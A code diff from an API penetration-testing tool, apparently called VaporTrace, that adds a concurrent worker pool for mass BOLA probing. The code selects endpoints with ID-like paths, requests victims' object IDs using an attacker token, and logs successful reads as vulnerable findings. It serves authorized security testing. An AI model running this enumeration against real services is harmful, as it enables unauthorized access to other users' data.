@@ -35,7 +35,8 @@ func (b *BOLAContext) getResource(resourceID string, token string) (int, string,
 	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.4 Surgical)")
 
 	// GlobalClient is defined in network.go
-	resp, err := GlobalClient.Do(req)
+	// SafeDo (Phase 9.6) ensures traffic is mirrored for security team visibility
+	resp, err := SafeDo(req, false, "BOLA-ENGINE") 
 	if err != nil {
 		return 0, "", err
 	}
@@ -43,6 +44,32 @@ func (b *BOLAContext) getResource(resourceID string, token string) (int, string,
 
 	body, _ := io.ReadAll(resp.Body)
 	return resp.StatusCode, string(body), nil
+}
+
+// ExecuteMassBOLA orchestrates concurrent probes across all identified targets (Phase 9.7)
+func (b *BOLAContext) ExecuteMassBOLA(idList []string, concurrency int) {
+	pterm.DefaultSection.Println("Phase 9.7: BOLA Concurrency Engine")
+	
+	var targets []string
+	GlobalDiscovery.mu.Lock()
+	for _, path := range GlobalDiscovery.Endpoints {
+		// Identify targets with ID patterns like /user/{id} or /api/v1/orders/101
+		if strings.Contains(path, "{") || strings.Contains(path, "id") {
+			targets = append(targets, path)
+		}
+	}
+	GlobalDiscovery.mu.Unlock()
+
+	if len(targets) == 0 {
+		pterm.Warning.Println("No BOLA-eligible targets found in the discovery pipeline.")
+		return
+	}
+
+	for _, targetPath := range targets {
+		pterm.Info.Printfln("Spawning worker pool for endpoint: %s", targetPath)
+		b.BaseURL = targetPath
+		b.MassProbe(idList, concurrency)
+	}
 }
 
 // Probe handles a single, detailed BOLA analysis with UI feedback (Phase 9.2)
@@ -122,22 +149,19 @@ func (b *BOLAContext) Probe() {
 	}
 }
 
-// MassProbe handles high-speed concurrent BOLA scanning (Phase 9.3)
-func (b *BOLAContext) MassProbe(idList []string, threads int) {
-	pterm.DefaultHeader.WithFullWidth(false).Println("BOLA Concurrency Engine [PHASE 9.3]")
-	
-	idChan := make(chan string, len(idList))
+// MassProbe implements the high-speed concurrent worker pool (Phase 9.7)
+func (b *BOLAContext) MassProbe(idList []string, concurrency int) {
+	pb, _ := pterm.DefaultProgressbar.WithTotal(len(idList)).WithTitle("Scanning IDs").Start()
+	idChan := make(chan string, concurrency)
 	var wg sync.WaitGroup
 
-	pb, _ := pterm.DefaultProgressbar.WithTotal(len(idList)).WithTitle("Scanning IDs").Start()
-
-	// 1. Spawn Worker Pool
-	for w := 1; w <= threads; w++ {
+	// 1. Initialize Worker Pool
+	for i := 0; i < concurrency; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
 			for id := range idChan {
-				instance := *b // Thread-safe local copy
+				instance := *b // Local copy for thread-safety
 				instance.VictimID = id
 				instance.ProbeSilent() 
 				pb.Increment()
@@ -145,19 +169,19 @@ func (b *BOLAContext) MassProbe(idList []string, threads int) {
 		}()
 	}
 
-	// 2. Feed IDs
+	// 2. Distribute IDs to workers
 	for _, id := range idList {
 		idChan <- id
 	}
 	close(idChan)
 
-	// 3. Cleanup
+	// 3. Finalize scan
 	wg.Wait()
 	pb.Stop()
-	pterm.Success.Println("Mass Scan Complete. Results persisted to database.")
+	pterm.Success.Println("Mass scan completed successfully.")
 }
 
-// ProbeSilent is the worker-friendly version for high-speed scanning (Phase 9.3 + 9.4)
+// ProbeSilent provides a performance-optimized execution for mass scanning
 func (b *BOLAContext) ProbeSilent() {
 	activeToken := b.AttackerToken
 	if activeToken == "" {
@@ -165,32 +189,22 @@ func (b *BOLAContext) ProbeSilent() {
 	}
 
 	code, body, err := b.getResource(b.VictimID, activeToken)
-	if err != nil {
-		return
+	if err != nil || code != 200 { 
+		return 
 	}
 
-	if code == 200 {
-		lowerBody := strings.ToLower(body)
-		if strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") {
-			return
-		}
+	lowerBody := strings.ToLower(body)
+	if strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") { 
+		return 
+	}
 
-		// UI Output for findings
-		pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
-		pterm.Warning.Printfln(" BOLA Confirmed: %s", b.VictimID)
+	pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
+	pterm.Warning.Printfln(" BOLA HIT: %s/%s", b.BaseURL, b.VictimID)
 
-		// PHASE 9.4: Mirror to Proxy (Burp/ZAP) for manual inspection
-		go func(targetID string, token string) {
-			// Sending a background request through GlobalClient (Proxy-aware)
-			b.getResource(targetID, token)
-		}(b.VictimID, activeToken)
-
-		// Log to Database
-		db.LogQueue <- db.Finding{
-			Phase:   "PHASE 9.3: CONCURRENT BOLA",
-			Target:  b.BaseURL + "/" + b.VictimID,
-			Details: "Confirmed via Multi-threaded Worker Pool",
-			Status:  "EXPLOITED",
-		}
+	db.LogQueue <- db.Finding{
+		Phase:   "PHASE III: AUTH LOGIC",
+		Target:  b.BaseURL + "/" + b.VictimID,
+		Details: "Automated BOLA mass-detection hit",
+		Status:  "VULNERABLE",
 	}
 }
